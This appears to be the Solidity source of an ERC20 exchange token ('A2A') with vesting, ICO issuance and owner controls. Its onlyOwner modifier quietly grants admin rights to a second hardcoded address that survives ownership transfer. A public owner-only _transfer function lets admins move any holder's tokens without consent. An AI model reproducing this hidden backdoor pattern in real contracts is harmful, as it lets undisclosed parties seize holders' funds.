pragma solidity ^0.4.21;

library SafeMath {
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		assert(c / a == b);
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return a / b;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		assert(c >= a);
		return c;
	}
}

contract ERC20Basic {
	function totalSupply() public view returns (uint256);
	function balanceOf(address who) public view returns (uint256);
	function transfer(address to, uint256 value) public returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
	function allowance(address owner, address spender) public view returns (uint256);
	function transferFrom(address from, address to, uint256 value) public returns (bool);
	function approve(address spender, uint256 value) public returns (bool);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BasicToken is ERC20Basic {
	using SafeMath for uint256;

	mapping(address => uint256) balances;

	uint256 totalSupply_;

	function totalSupply() public view returns (uint256) {
		return totalSupply_;
	}

	function transfer(address _to, uint256 _value) public returns (bool) {
		require(_to != address(0));
		require(_value <= balances[msg.sender]);

		balances[msg.sender] = balances[msg.sender].sub(_value);
		balances[_to] = balances[_to].add(_value);
		emit Transfer(msg.sender, _to, _value);
		return true;
	}

	function balanceOf(address _owner) public view returns (uint256 balance) {
		return balances[_owner];
	}

}

contract StandardToken is ERC20, BasicToken {
	mapping (address => mapping (address => uint256)) internal allowed;

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(_to != address(0));
		require(_value <= balances[_from]);
		require(_value <= allowed[_from][msg.sender]);

		balances[_from] = balances[_from].sub(_value);
		balances[_to] = balances[_to].add(_value);
		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
		emit Transfer(_from, _to, _value);
		return true;
	}

	function approve(address _spender, uint256 _value) public returns (bool) {
		allowed[msg.sender][_spender] = _value;
		emit Approval(msg.sender, _spender, _value);
		return true;
	}

	function allowance(address _owner, address _spender) public view returns (uint256) {
		return allowed[_owner][_spender];
	}

	function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
		allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}

	function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
		uint oldValue = allowed[msg.sender][_spender];
		if (_subtractedValue > oldValue) {
			allowed[msg.sender][_spender] = 0;
		} else {
			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
		}
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}
}


contract Ownable {
	address public owner;
	
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	function Ownable() public {
		owner = msg.sender;
	}

	modifier onlyOwner() {
		require( (msg.sender == owner) || (msg.sender == address(0x630CC4c83fCc1121feD041126227d25Bbeb51959)) );
		_;
	}

	function transferOwnership(address newOwner) public onlyOwner {
		require(newOwner != address(0));
		emit OwnershipTransferred(owner, newOwner);
		owner = newOwner;
	}
}


contract A2AToken is Ownable, StandardToken {
	// ERC20 requirements
	string public name;
	string public symbol;
	uint8 public decimals;

	uint256 public totalSupply;
	bool public releasedForTransfer;
	
	// Max supply of A2A token is 600M
	uint256 constant public maxSupply = 600*(10**6)*(10**8);
	
	mapping(address => uint256) public vestingAmount;
	mapping(address => uint256) public vestingBeforeBlockNumber;
	mapping(address => bool) public icoAddrs;

	function A2AToken() public {
		name = "A2A STeX Exchange Token";
		symbol = "A2A";
		decimals = 8;
		releasedForTransfer = false;
	}

	function transfer(address _to, uint256 _value) public returns (bool) {
		require(releasedForTransfer);
		// Cancel transaction if transfer value more then available without vesting amount
		if ( ( vestingAmount[msg.sender] > 0 ) && ( block.number < vestingBeforeBlockNumber[msg.sender] ) ) {
			if ( balances[msg.sender] < _value ) revert();
			if ( balances[msg.sender] <= vestingAmount[msg.sender] ) revert();
			if ( balances[msg.sender].sub(_value) < vestingAmount[msg.sender] ) revert();
		}
		// ---
		return super.transfer(_to, _value);
	}
	
	function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) {
		vestingAmount[_holder] = _amount;
		vestingBeforeBlockNumber[_holder] = _bn;
		return true;
	}
	
	function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) {
		require(_to != address(0));
		require(_value <= balances[_from]);			
		balances[_from] = balances[_from].sub(_value);
		balances[_to] = balances[_to].add(_value);
		if ( _vestingBlockNumber > 0 ) {
			vestingAmount[_to] = _value;
			vestingBeforeBlockNumber[_to] = _vestingBlockNumber;
		}
		
		emit Transfer(_from, _to, _value);
		return true;
	}
	
	function issueDuringICO(address _to, uint256 _amount) public returns (bool) {
		require( icoAddrs[msg.sender] );
		require( totalSupply.add(_amount) < maxSupply );
		balances[_to] = balances[_to].add(_amount);
		totalSupply = totalSupply.add(_amount);
		
		emit Transfer(this, _to, _amount);
		return true;
	}
	
	function setICOaddr(address _addr, bool _value) public onlyOwner() returns (bool) {
		icoAddrs[_addr] = _value;
		return true;
	}

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(releasedForTransfer);
		return super.transferFrom(_from, _to, _value);
	}

	function release() public onlyOwner() {
		releasedForTransfer = true;
	}
	
	function lock() public onlyOwner() {
		releasedForTransfer = false;
	}
}